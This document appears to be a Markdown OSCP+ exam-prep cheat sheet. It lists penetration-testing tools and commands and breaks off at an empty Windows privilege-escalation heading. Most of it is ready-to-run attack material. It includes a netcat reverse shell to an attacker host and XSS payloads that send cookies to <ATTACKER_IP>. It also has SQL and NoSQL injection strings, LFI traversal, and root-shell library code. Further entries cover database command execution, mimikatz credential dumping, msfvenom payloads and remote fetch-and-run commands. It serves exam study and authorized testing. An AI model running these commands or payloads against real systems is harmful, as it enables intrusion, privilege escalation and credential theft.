# OSCP+ Cheat Sheet

> **Exam Restrictions**: Automatic exploitation tools like `sqlmap` and LinPEAS auto-exploitation are prohibited. Always verify current guidelines before the exam.
> - [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
> - [Proctored Exams](https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams)

---

## Table of Contents

- [Tool Reference](#tool-reference)
- [Commands](#commands)
  - [Basics](#basics)
  - [Information Gathering](#information-gathering)
  - [Web Application Analysis](#web-application-analysis)
  - [Database Analysis](#database-analysis)
  - [Password Attacks](#password-attacks)
  - [Exploitation Tools](#exploitation-tools)
  - [Post Exploitation](#post-exploitation)
  - [Port Forwarding & Tunneling](#port-forwarding--tunneling)
  - [Virtualization & Hypervisor Attacks](#virtualization--hypervisor-attacks)
  - [Social Engineering Tools](#social-engineering-tools)
- [CVEs & LPE Techniques](#cves--lpe-techniques)
- [Payloads & Reverse Shells](#payloads--reverse-shells)
- [Wordlists](#wordlists)
- [Reporting](#reporting)

---

## Tool Reference

### Basics & Pivoting

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |

### Web Application Analysis

| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| feroxbuster | https://github.com/epi052/feroxbuster |
| Gobuster | https://github.com/OJ/gobuster |
| fpmvuln | https://github.com/hannob/fpmvuln |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |

### Database Assessment

| Name | URL |
| --- | --- |
| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

### Password Attacks

| Name | URL |
| --- | --- |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| NetExec | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | https://ntlm.pw |
| pypykatz | https://github.com/skelsec/pypykatz |

### Exploitation & Post Exploitation

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| ADCSKiller | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | https://github.com/ajm4n/adPEAS |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| DonPAPI | https://github.com/login-securite/DonPAPI |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| JAWS | https://github.com/411Hall/JAWS |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinPEAS | https://github.com/carlospolop/linpeas |
| LinEnum | https://github.com/rebootuser/LinEnum |
| lsassy | https://github.com/Hackndo/lsassy |
| nanodump | https://github.com/fortra/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| pspy | https://github.com/DominicBreuker/pspy |
| pwncat | https://github.com/calebstewart/pwncat |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| WADComs | https://wadcoms.github.io |
| WESNG | https://github.com/bitsadmin/wesng |
| Whisker | https://github.com/eladshamir/Whisker |
| pyWhisker | https://github.com/ShutdownRepo/pywhisker |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### Reporting

| Name | URL |
| --- | --- |
| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
| SysReptor | https://github.com/Syslifters/sysreptor |
| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |

### Social Media Resources

| Name | URL |
| --- | --- |
| HackTricks | https://book.hacktricks.xyz/ |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
| Hacking Articles | https://www.hackingarticles.in/ |

---

## Commands

### Basics

#### curl

```bash
curl -v http://<DOMAIN>                                          # verbose output
curl -X POST http://<DOMAIN>                                     # use POST method
curl -X PUT http://<DOMAIN>                                      # use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd   # handle /../ or /./ in URL
curl --proxy http://127.0.0.1:8080                               # use proxy
curl -F myFile=@<FILE> http://<RHOST>                            # file upload
curl${IFS}<LHOST>/<FILE>                                         # IFS bypass
```

#### File Transfer

##### Certutil (Windows)
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

##### Netcat
```bash
nc -lnvp <LPORT> > <FILE>                                        # Listener
nc <RHOST> <RPORT> < <FILE>                                      # Sender
mkfifo /tmp/backpipe;cat /tmp/backpipe|bash -i 2>&1|nc <ATTACKER_IP> 1337 > /tmp/backpipe
```

##### Impacket SMB
```bash
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

##### PowerShell
```powershell
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

##### Python/PHP Web Servers
```bash
sudo python3 -m http.server 80
sudo php -S 127.0.0.1:80
```

#### FTP

```bash
ftp <RHOST>
ftp -A <RHOST>
wget -r ftp://anonymous:anonymous@<RHOST>
```

#### Kerberos

```bash
sudo apt-get install krb5-kdc
```

##### Ticket Handling
```bash
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache
export KRB5CCNAME='realpath <FILE>.ccache'
```

##### Config: /etc/krb5.conf
```ini
[libdefaults]
  default_realm = REALM.TLD
  dns_lookup_kdc = true
  dns_lookup_realm = true
```

##### Ticket Conversion

```bash
# kirbi to ccache
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`

# ccache to kirbi
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
```

#### RDP

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
```

#### SMB

```bash
smbclient -L \\<RHOST>\ -N
smbclient //<RHOST>/<SHARE>
smbclient //<RHOST>/<SHARE> -U <USERNAME>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
mount.cifs //<RHOST>/<SHARE> /mnt/remote

# Download multiple files
mask""
recurse ON
prompt OFF
mget *
```

#### SSH

```bash
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### Upgrading Shells

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: ctrl+z → stty raw -echo → fg → enter → enter
export XTERM=xterm

# Alternative
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

# Script method
script -q /dev/null -c bash
```

#### Tmux

```bash
ctrl b + w          # show windows
ctrl + "            # split horizontal
ctrl + %            # split vertical
ctrl + ,            # rename window
ctrl b + [          # enter copy mode
ctrl + /            # search in copy mode (vi)
shift + P           # start/stop logging
```

#### Time Sync (Important for Kerberos)

```bash
sudo ntpdate <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
while [ 1 ]; do sudo ntpdate <RHOST>;done    # continuous sync
```

---

### Information Gathering

#### Nmap

```bash
sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
```

#### Port Scanning (No Nmap)

```bash
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open" 2>/dev/null; done
```

#### DNS Enumeration

```bash
# AD Domain Controller SRV Record Lookup
dig @<DNS_SERVER_IP> _ldap._tcp.dc._msdcs.<AD_DOMAIN> SRV +short
# Example: dig @10.10.11.60 _ldap._tcp.dc._msdcs.frizz.htb SRV +short
# Output: 0 100 389 frizzdc.frizz.htb.  (priority weight port hostname)
```

#### NetBIOS / SMB Enumeration

```bash
nbtscan <RHOST>
nmblookup -A <RHOST>
enum4linux-ng -A <RHOST>
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
```

#### SNMP

```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
```

#### memcached

```bash
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211
sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info
```

#### ldapsearch

```bash
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

---

### Web Application Analysis

#### Burp Suite

```
Ctrl+r          # send to repeater
Ctrl+i          # send to intruder
Ctrl+Shift+b    # base64 encode
Ctrl+Shift+u    # URL decode

export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

#### ffuf

```bash
# Directory scan
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401

# Subdomain/VHost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://HOST.TLD -H "Host: FUZZ.HOST.TLD" -fs 0 -ac -fc 400,404,500
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185

# API fuzzing
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

# LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../index.php?page=FUZZ -fs 15349

# With PHP session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644

# Recursion
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -recursion

# File extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -e .log
```

#### feroxbuster

```bash
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -r --filter-status 403
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -t 100
```

#### Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# Common extensions: txt,bak,php,html,js,asp,aspx
```

#### wfuzz

```bash
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/FUZZ.txt --sc 200 -t 20
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST --hc 200 -c
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select
```

#### WPScan

```bash
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

#### Local File Inclusion (LFI)

```bash
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd%00    # php < 5.3
```

##### Encoded Traversal Strings
```
../
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
..././
```

##### php://filter Wrapper
```bash
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

##### Key Linux Files
```
/etc/passwd          /etc/shadow          /etc/hosts
/proc/self/environ   /proc/self/net/arp   /proc/cmdline
~/.ssh/id_rsa        ~/.bash_history      ~/.ssh/authorized_keys
/var/log/apache2/access.log              /var/log/auth.log
/etc/ssh/sshd_config                     /etc/crontab
```

##### Key Windows Files
```
C:/Windows/repair/SAM                    C:/Windows/win.ini
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
```

#### Server-Side Template Injection (SSTI)

```
# Fuzz string
${{<%[%'"}}%\.

# Magic payload
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### Cross-Site Scripting (XSS)

```html
<script>alert('XSS');</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>new Image().src="http://<ATTACKER_IP>/collect?c="+encodeURIComponent(document.cookie)</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
```

#### XML External Entity (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

#### PHP Upload Filter Bypasses

```
.phtml .phP .Php .php3 .php4 .php5 .php7 .pht .phar
<FILE>.php%00.jpg    <FILE>.php%0a    <FILE>.php.jpg
```

#### PHP Filter Chain Generator

```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
```

#### GitTools

```bash
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

---

### Database Analysis

#### MySQL

```bash
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
```

```sql
SHOW databases;
USE <DATABASE>;
SHOW tables;
SELECT * FROM users \G;
SELECT LOAD_FILE('/etc/passwd');
SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' LINES TERMINATED BY '\n';
\! /bin/sh                          -- drop shell
```

#### MSSQL

```bash
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;

-- xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Steal NetNTLM
exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'

-- List files
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

#### PostgreSQL

```bash
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

```sql
\list           -- list databases
\c <DATABASE>   -- use database
\dt             -- list tables
\du             -- list users
SELECT usename, passwd from pg_shadow;

-- RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

#### MongoDB

```bash
mongo "mongodb://localhost:27017"
```

```
use <DATABASE>;
show collections;
db.users.find();
db.getUsers({showCredentials: true});
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

#### Redis

```bash
redis-cli -h <RHOST>
AUTH <PASSWORD>
CONFIG GET *
KEYS *
GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b

# Write SSH key
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt
cat /tmp/key.txt | redis-cli -h <RHOST> -x set s-key
redis-cli -h <RHOST>
> CONFIG SET dir /var/lib/redis/.ssh
> CONFIG SET dbfilename authorized_keys
> save
```

#### sqlite3

```bash
sqlite3 <FILE>.db
.tables
PRAGMA table_info(<TABLE>);
SELECT * FROM <TABLE>;
```

#### SQL Injection

##### Authentication Bypass
```sql
admin' or '1'='1
' or 1=1 limit 1 -- -+
'-'
' or true--
admin' --
```

##### MySQL Union-based
```sql
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
-1 union select 1,2,version();#
-1 union select 1,2,database();#
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

##### Blind SQLi
```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

##### NoSQL Injection
```
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null}}
```

---

### Password Attacks

#### hashcat

```bash
hashcat -m 0    md5hash /PATH/TO/WORDLIST
hashcat -m 100  sha1hash /PATH/TO/WORDLIST
hashcat -m 1000 ntlmhash /PATH/TO/WORDLIST
hashcat -m 1800 sha512hash /PATH/TO/WORDLIST
hashcat -m 13100 kerberoast_hashes /PATH/TO/WORDLIST
hashcat -m 18200 asreproast_hashes /PATH/TO/WORDLIST
hashcat -m 5600  netntlmv2 /PATH/TO/WORDLIST
hashcat -m 3200  bcrypt /PATH/TO/WORDLIST

# With rules
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule

# Custom rules
echo \$1 > custom.rule           # append 1
echo 'c' >> custom.rule          # capitalize first
hashcat -r custom.rule --stdout wordlist.txt   # preview

# Identify hash type
hashcat --identify --user <FILE>

# OpenSSH key
openssl pkcs8 -in id_rsa -outform DER -out key.der -nocrypt
hashcat -m 16200 key.der /PATH/TO/WORDLIST
```

#### John

```bash
keepass2john <FILE>
ssh2john id_rsa > <FILE>
zip2john <FILE> > <FILE>
john <FILE> --wordlist=/PATH/TO/WORDLIST --format=crypt
john --show <FILE>
```

#### Hydra

```bash
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST <PROTOCOL>
hydra <RHOST> -L users.txt -P passwords.txt <PROTOCOL>
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/index.php:username=user&password=^PASS^:Login failed"
```

#### fcrack (ZIP)

```bash
fcrackzip -u -D -p /PATH/TO/WORDLIST <FILE>.zip
```

#### mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::sam
lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>
kerberos::golden /user:Administrator /domain:... /sid:... /krbtgt:<HASH> /id:500
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
token::elevate
vault::cred
vault::list
```

#### pypykatz

```bash
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

#### Group Policy Preferences (GPP)

```bash
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

#### DonPAPI

```bash
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
DonPAPI -local_auth <USERNAME>@<RHOST>
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
```

#### Kerbrute

```bash
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES -t 50
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES <PASSWORD>
```

#### LaZagne

```bash
laZagne.exe all
```

---

### Exploitation Tools

#### Metasploit

```bash
sudo msfdb run
msf6 > workspace -a <WORKSPACE>
msf6 > db_nmap <OPTIONS>
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <LHOST>
msf6 > set LPORT <LPORT>
msf6 > run

# Meterpreter
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run post/windows/manage/enable_rdp
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1
meterpreter > sessions -u <ID>     # upgrade to meterpreter
```

##### Generate Payloads

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f raw -o payload.bin
```

---

### Post Exploitation

#### Linux Enumeration

```bash
id && sudo -l && env
cat ~/.bashrc
cat /etc/passwd /etc/hosts /etc/fstab /etc/crontab
lsblk && ss -tulpn && ps -auxf
ls -lahv /opt /home
find / -perm -4000 2>/dev/null | xargs ls -la                   # SUID binaries
find / -type f -user root -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null
find / -cmin -60 2>/dev/null                                     # changed in last 60 min
find ./ -type f -exec grep --color=always -i -I 'password' {} \;
getfacl <LOCAL_DIRECTORY>
/usr/share/peass/linpeas.sh
```

#### Linux Privilege Escalation

##### Sudo Bypass

```bash
# LD_PRELOAD
# shell.c:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }

gcc -o shell.so shell.c -shared -FPIC -nostartfiles
sudo LD_PRELOAD=/path/to/shell.so <BINARY>
```

##### SUID Abuse

```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
sudo /usr/sbin/apache2 -f <FILE>                                 # read first line as root
```

##### Capabilities

```bash
capsh --print
/usr/sbin/getcap -r / 2>/dev/null
```

##### Wildcard Abuse

```bash
touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'
```

##### Writable /etc/passwd

```bash
openssl passwd <PASSWORD>
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

##### Shared Library Misconfiguration

```bash
ldd /PATH/TO/BINARY
# shell.c: #include <stdlib.h> ... void _init() { setuid(0); setgid(0); system("/bin/bash -i"); }
gcc -shared -fPIC -nostartfiles -o <LIBRARY>.so <FILE>.c
sudo LD_LIBRARY_PATH=/path/to/lib <BINARY>
```

##### logrotten (Log Rotation Exploit)

```bash
./logrotten -p ./payloadfile /tmp/log/pwnme.log
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log    # if compress option set
```

##### rbash Breakouts

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
less /etc/profile → !/bin/sh
vi -c ':!/bin/sh' /dev/null
ssh <USERNAME>@<RHOST> -t sh
```

##### Writable Directories

```
/dev/shm
/tmp
```

#### Windows Enumeration

```powershell
whoami /all
systeminfo
net accounts && net user && net user /domain
Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember <GROUP>
Get-Process
tree /f C:\Users\
tasklist /SVC
sc query
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Hidden files
dir /a && dir /a:h && powershell ls -force

# Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

#### Windows Credential Harvesting

```powershell
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# PowerShell history
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Find passwords
findstr /si password *.xml *.ini *.txt
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Dump hashes
reg save hklm\system system.hive
reg save hklm\sam sam.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

#### Windows Privilege Escalation

